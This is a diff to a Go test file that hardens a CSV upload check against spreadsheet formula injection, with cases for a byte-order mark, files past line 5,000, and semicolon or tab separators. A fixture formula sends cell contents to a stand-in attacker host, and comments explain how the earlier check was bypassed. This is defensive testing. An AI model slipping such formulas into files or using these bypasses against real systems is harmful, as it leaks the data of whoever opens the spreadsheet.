@@ -495,3 +495,48 @@ func TestTheUploadCheckRefusesEveryCellTheExportWouldGuard(t *testing.T) {
 		t.Errorf("a file the records export wrote was refused: %v\n%q", err, body)
 	}
 }
+
+// A formula is refused wherever in the file a spreadsheet would read it as
+// one: in the first cell after the byte-order mark, past the five
+// thousandth line, and in a cell a semicolon or a tab begins.
+//
+// The check looked only at cells a comma begins, in the first 5,001 lines,
+// with a byte-order mark read as part of the first cell. A spreadsheet
+// takes the mark off before it reads the file, finds the separator for
+// itself (Sheets and LibreOffice by looking, Excel by the list separator
+// of its country, which is a semicolon across much of Europe), and reads
+// every line. So a file a visitor attached to a form, with a formula in
+// any of those places, was accepted, and ran when the site's owner opened
+// it.
+func TestTheUploadCheckFindsAFormulaWhereverASpreadsheetWouldRunIt(t *testing.T) {
+	formula := `=HYPERLINK("http://evil.example/?"&B2)`
+	for name, body := range map[string]string{
+		"after the byte-order mark": "\ufeff" + formula + ",b\n1,2\n",
+		"past line 5,000":           strings.Repeat("a,b\n", 5001) + "1," + formula + "\n",
+		"after a semicolon":         "a;b\n1;" + formula + "\n",
+		"after a tab":               "a\tb\n1\t" + formula + "\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err == nil {
+			t.Errorf("a CSV with a formula %s was accepted", name)
+		}
+	}
+
+	// Control: the same shapes with nothing a spreadsheet runs are taken,
+	// a negative number after each separator included.
+	for name, body := range map[string]string{
+		"with a byte-order mark": "\ufeffid,b\n1,-4.5\n",
+		"of 5,002 lines":         strings.Repeat("a,b\n", 5001) + "1,-4.5\n",
+		"split by semicolons":    "a;b\n1;-4.5\n",
+		"split by tabs":          "a\tb\n1\t-4.5\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err != nil {
+			t.Errorf("an ordinary CSV %s was refused: %v", name, err)
+		}
+	}
+	recs := []collection.Record{{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", "balance": -4.5}}}
+	if body := sheet.Write(nil, recs, sheet.WriteOptions{BOM: true}); !bytes.HasPrefix(body, []byte("\ufeff")) {
+		t.Fatalf("control: the export has no byte-order mark:\n%q", body)
+	} else if _, err := Accept("records.csv", body, now); err != nil {
+		t.Errorf("a file the records export wrote for Excel was refused: %v\n%q", err, body)
+	}
+}
